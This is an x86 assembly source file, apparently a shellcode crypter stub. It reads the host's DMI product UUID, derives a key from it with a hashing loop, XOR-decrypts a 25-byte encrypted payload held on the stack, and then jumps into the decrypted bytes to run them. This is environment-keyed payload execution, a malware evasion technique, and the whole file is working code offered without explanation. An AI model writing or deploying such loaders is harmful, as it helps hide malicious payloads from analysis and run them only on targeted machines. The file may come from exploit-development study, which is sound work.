
;decryptor.asm

SECTION .data
	s3: db "/sys/class/dmi/id/product_uuid",0

SECTION .text

global _start




_start:

	xor eax,eax
	xor ebx,ebx
	xor edx,edx
	xor ecx,ecx

	;mov al,1     
	;cpuid
	;mov ecx,ebx
	;add eax, ebx
	;add eax, ecx
	;add eax, edx


	;xor ebx,ebx
	;xor edx,edx
	;xor ecx,ecx

	push ebp
	mov ebp, esp
	;sub    esp,176
	sub esp, 44
	sub esp, 56
	sub esp, 38
	sub esp, 38
	mov ebx, DWORD [ebp-0x4]
	xor ebx, ebx
	mov DWORD [ebp-0x4], ebx
	;mov    DWORD [ebp-0x4],0x0
	mov ebx, DWORD [ebp-0x8]
	xor ebx, ebx
	mov DWORD [ebp-0x8], ebx
	;mov    DWORD [ebp-0x8],0x0
	mov ebx, DWORD [ebp-0x14]
	xor ebx, ebx
	mov DWORD [ebp-0x14], ebx
  	;mov    DWORD [ebp-0x14],0x0
 	mov ebx, DWORD [ebp-0x18]
	xor ebx, ebx
	mov DWORD [ebp-0x18], ebx
 	;mov    DWORD [ebp-0x18],0x0
  	mov ebx, DWORD [ebp-0xc]
	xor ebx, ebx
	mov DWORD [ebp-0xc], ebx
  	;mov    DWORD [ebp-0xc],0x0
  	mov ebx, DWORD [ebp-0x1c]
	xor ebx, ebx
	mov DWORD [ebp-0x1c], ebx
  	;mov    DWORD [ebp-0x1c],0x0
  	mov    DWORD [ebp-0x20],0x41414141
 	mov    DWORD [ebp-0x24],0xab1d213
  	xor ebx,ebx
  	inc ebx
  	mov    DWORD [ebp-0x28],ebx
   	;mov    eax,DWORD [ebp-0x20]
   	;mov    DWORD [ebp-0x10],eax
 	mov    DWORD [ebp-0x42],0x587ceb03
  	mov    DWORD [ebp-0x3e],0x59430803
  	mov    DWORD [ebp-0x3a],0x4d480944
  	mov    DWORD [ebp-0x36],0x7ec7ac5e
  	mov    DWORD [ebp-0x32],0xad75c1a7
	mov    DWORD [ebp-0x2e],0xe82395cc
  	xor ebx,ebx
  	mov	bl, 0xb1
  	mov    [ebp-0x2a],bl
  	mov ebx, DWORD [ebp-0x8]
	xor ebx, ebx
	mov DWORD [ebp-0x8], ebx
  	;mov    DWORD [ebp-0x8],0x0
  	
  	
  	sub esp,40
  	
  	mov ebx, s3
  	xor eax,eax
	mov al, 5
	xor ecx,ecx
	mov cl, 2
	int 0x80
  	
  	
  	mov ebx,eax
  	mov ecx,esp
  	xor edx,edx
  	mov dl,36
  	xor eax,eax
  	mov al,3
  	int 0x80
  	
  	xor eax,eax
  	mov ebx, dword [esp]
  	add eax,ebx
  	mov ebx, dword [esp+4]
  	add eax,ebx
  	mov ebx, dword [esp+8]
  	add eax,ebx
  	mov ebx, dword [esp+12]
  	add eax,ebx
  	mov ebx, dword [esp+16]
  	add eax,ebx
  	mov ebx, dword [esp+20]
  	add eax,ebx
  	mov ebx, dword [esp+24]
  	add eax,ebx
  	mov ebx, dword [esp+28]
  	add eax,ebx
  	mov ebx, dword [esp+32]
  	add eax,ebx
  	
  	mov DWORD [ebp-0x10], eax
	
	loop1:
		xor ebx,ebx
		add ebx,1234567899
		add ebx,912915749
		mov    DWORD [ebp-0x18],ebx
		;mov    DWORD [ebp-0x18],0x80000000 ;2147483648 in decimal
       	mov    eax,DWORD [ebp-0x24]
      	imul   eax,DWORD [ebp-0x10]
       	mov    edx,eax
       	mov    eax,DWORD [ebp-0x28]
       	add    eax,edx
       	mov    ecx,DWORD [ebp-0x18]
       	xor edx,edx
     	;mov    edx,0x0
       	div    ecx
       	mov    DWORD [ebp-0x10],edx
       	mov    eax,DWORD [ebp-0x10]
       	mov    DWORD [ebp-0xc],eax
      	
      	loop2:
			mov    eax,DWORD [ebp-0x4]
			lea    edx,[eax+0x1]
			mov    DWORD [ebp-0x4],edx
			mov    edx,DWORD [ebp-0xc]
			mov    ecx,edx
			sar    ecx,0x1f
			shr    ecx,0x1c
			add    edx,ecx
			and    edx,0xf
			sub    edx,ecx
			add    edx,0x23
			mov    BYTE [ebp+eax*1-0xa6],dl
			mov    eax,DWORD [ebp-0xc]
			lea    edx,[eax+0xf]
			test   eax,eax
			cmovs  eax,edx
			sar    eax,0x4
			mov    DWORD [ebp-0xc],eax
			xor ebx,ebx
			cmp    DWORD [ebp-0xc],ebx
			;cmp    DWORD [ebp-0xc],0x0
			jne    loop2
			
		add    DWORD [ebp-0x8],0x1
       	cmp    DWORD [ebp-0x8],0x9
		jle	   loop1
	
	xor ebx,ebx
	mov    DWORD [ebp-0x4],ebx
	;mov    DWORD [ebp-0x4],0x0
	loop3:
		lea    edx,[ebp-0x42]
		mov    eax,DWORD [ebp-0x4]
		add    eax,edx
		
		
		xor ebx,ebx
		xor edx,edx
		mov bl, BYTE[eax]
		mov dl,bl
		
;		movzx  edx,BYTE [eax]
		lea    ecx,[ebp-0xa6]
		mov    eax,DWORD [ebp-0x4]
		add    eax,ecx
		xor ebx,ebx
		
		mov bl,BYTE[eax]
		xor eax,eax
		mov al,bl
		;movzx  eax,BYTE [eax]
		xor    eax,edx
		lea    ecx,[ebp-0x42]
		mov    edx,DWORD [ebp-0x4]
		add    edx,ecx
		mov    BYTE [edx],al
		add    DWORD [ebp-0x4],0x1
		cmp    DWORD [ebp-0x4],0x18
		jle    loop3 
	
	xor eax,eax
	lea eax, [ebp-0x42]
	jmp eax

	xor eax, eax
	mov al, 1      
	xor ebx,ebx
	int 0x80

;file_location:
;	Loc: db 0x2f, 0x73, 0x79, 0x73, 0x2f, 0x63, 0x6c, 0x61, 0x73, 0x73, 0x2f, 0x64, 0x6d, 0x69, 0x2f, 0x69, 0x64, 0x2f, 0x70, 0x72, 0x6f, 0x64, 0x75, 0x63, 0x74, 0x5f, 0x75, 0x75, 0x69, 0x64
